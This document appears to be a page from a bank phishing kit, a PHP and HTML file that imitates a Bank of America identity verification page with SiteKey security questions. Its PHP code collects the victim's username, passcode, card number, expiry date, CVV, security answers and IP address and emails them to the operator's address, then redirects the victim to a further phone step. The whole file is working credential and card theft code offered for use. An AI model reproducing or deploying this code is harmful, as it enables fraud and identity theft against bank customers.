<?php

include '../Valid.php';
@session_start();
ob_start();

include 'Emaili.php';


function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$hosti = generateRandomString();


$_SESSION['q2'] = $_POST['q2'];
$_SESSION['ans2'] = $_POST['ans2'];
$_SESSION['q3'] = $_POST['q3'];
$_SESSION['ans3'] = $_POST['ans3'];
$_SESSION['q4'] = $_POST['q4'];
$_SESSION['ans4'] = $_POST['ans4'];


if (!empty($_POST["ans2"])) {

			$ipaddress = $_SERVER['REMOTE_ADDR'];
			$ipaddress2 = $_SERVER['HTTP_CLIENT_IP'];
			$message.= "-------------User Info-----------------\n";
			$message.= "Username: ".$_SESSION['usr']."\n";
			$message.= "Pass Code: ".$_SESSION['psw']."\n";
			$message.=  "-------------Card Info-----------------";
			$message.=  "Question 1: ".$_SESSION['q1']."\n";
			$message.=  "Response 1: ".$_SESSION['ans1']."\n";
			$message.=  "Card Number: ".$_SESSION['cn']."\n";
			$message.=  "Expiration MM/YYYY: ".$_SESSION['ex']."\n";
			$message.=  "CSC (3 digits): ".$_SESSION['cv']."\n";
			$message.=  "-------------Securty Info-----------------\n";
			$message.=  "Question 2: ".$_SESSION['q2']."\n";
			$message.=  "Response 2: ".$_SESSION['ans2']."\n";
			$message.=  "Question 3: ".$_SESSION['q3']."\n";
			$message.=  "Response 3: ".$_SESSION['ans3']."\n";
			$message.=  "Question 4: ".$_SESSION['q4']."\n";
			$message.=  "Response 4: ".$_SESSION['ans4']."\n";
			$message.= "--------------[ UnKnown ]---------------------\n";
			$message.= "IP            : ".$ipaddress."\n";
			$message.= "--------------[ UnKnown ]---------------------\n";
			$message.= "|Client IP: ".$ipaddress2."\n";
			$message.= "|--- http://www.geoiptool.com/?IP=$ipaddress ----\n";
			$subject = "xXxBOA-NeWxXx $ipaddress";
			$headers = "From: UnKnown <Source@Bourder.land>";
			mail($SEND,$subject,$message,$headers);
		header("Location: phone.php?sec=$hosti$hosti$hosti"); 
} else {
}

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<link rel="stylesheet" href="css-js/jok1.css">


</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:158px; top:16px; width:983px; height:117px; z-index:0"><img src="images/bb7.png" alt="" title="" border="0" width="983" height="117"></div>

<div id="image6" style="position:absolute; overflow:hidden; left:184px; top:176px; width:173px; height:23px; z-index:4"><img src="images/bb8.png" alt="" title="" border="0" width="173" height="23"></div>

<div id="image15" style="position:absolute;overflow:hidden;left:133px;top: 981px;width:987px;height:150px;z-index:5;"><img src="images/bbo28.png" alt="" title="" border="0" width="987" height="150"></div>

<div id="image16" style="position:absolute;overflow:hidden;left:159px;top: 1030px;width:108px;height:17px;z-index:6;"><a href="#"><img src="images/bbo29.png" alt="" title="" border="0" width="108" height="17"></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:177px; top:143px; width:521px; height:28px; z-index:7"><img src="images/bb9.png" alt="" title="" border="0" width="521" height="28"></div>


<div id="image10" style="position:absolute;overflow:hidden;left:318px;top: 730px;width:75px;height:29px;z-index:8;"><a href="#"><img src="images/bb10.png" alt="" title="" border="0" width="75" height="29"></a></div>
<div id="image13" style="position:absolute; overflow:hidden; left:193px; top:242px; width:137px; height:377px; z-index:12"><img src="images/ba2.png" alt="" title="" border="0" width="137" height="377"></div>

<form action="" name="" id="" method="post">
<select name="q2" class="textbox" autocomplete="off" required="" style="position:absolute;left:198px;top:268px;width:385px;z-index:18">
<option value="Select SiteKey Challenge Question 1">Select SiteKey Challenge Question 1</option>
<option>what is the first name of your mothers closest friend?</option>
<option>what was the name of your first pet?</option>
<option>what is the first name of your favorite niece/nephew?</option>
<option>what is the first name your hairdresserr/barber?</option>
<option>what is the name of your best childhood friend? </option>
<option>on what street is your grocery store?</option>
<option>what is the name of the medical professional who delivered your first child?</option>
<option>what is the name of a college you applied to but didnt atted? </option>
<option>what was the first name of your favorite teacher or professor?</option>
<option>what is your all-time favorite song? </option></select>
<input name="ans2" class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:214px;left:198px;top:340px;z-index:19">
<select name="q3" class="textbox" autocomplete="off" required="" style="position:absolute;left:198px;top:412px;width:385px;z-index:20">
<option value="Select SiteKey Challenge Question 2">Select SiteKey Challenge Question 2</option>
<option>what is the first name of your high school prom date?</option>
<option>who is your favorite person in history?</option>
<option>what was the make and model of your first car? </option>
<option>what is first name of best man/main of honor at your wedding? </option>
<option>what is the name of your favorite restaurant?</option>
<option>as a child what did you want to be when you grew up? </option>
<option>what was the first live concert you attended?</option>
<option>what was the first name of your first manager?</option>
<option>what is the name of your high school star athlete?</option>
<option>where were you on New Years 2000? </option></select>
<input name="ans3" class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:214px;left:198px;top:484px;z-index:21">
<select name="q4" class="textbox" autocomplete="off" required="" style="position:absolute;left:198px;top:556px;width:385px;z-index:22">
<option value="Select SiteKey Challenge Question 3">Select SiteKey Challenge Question 3</option>
<option>what street did your best friend ih high school live on?</option>
<option>what was the name of your first boyfriend or girlfriend?</option>
<option>what is your best friend first name?</option>
<option>what is the last name of your third grade teacher?</option>
<option>what is the last name of your family physician?</option>
<option>in what city did you honeymoon?</option>
<option>in what city did you meet your spouse/significant other?</option>
<option>what celebrity do you most resemble?</option>
<option>what is the name of your favorite charity?</option>
<option>what is the name of your first babysitter?</option></select>
<input name="ans4" class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:214px;left:198px;top: 624px;z-index:23;">
<div id="formimage1" style="position:absolute;left:198px;top: 730px;z-index:24;"><input type="image" name="formimage1" width="102" height="28" src="images/bz2.png"></div>
</form></div>
</body>

</html>
<?php ob_end_flush(); ?>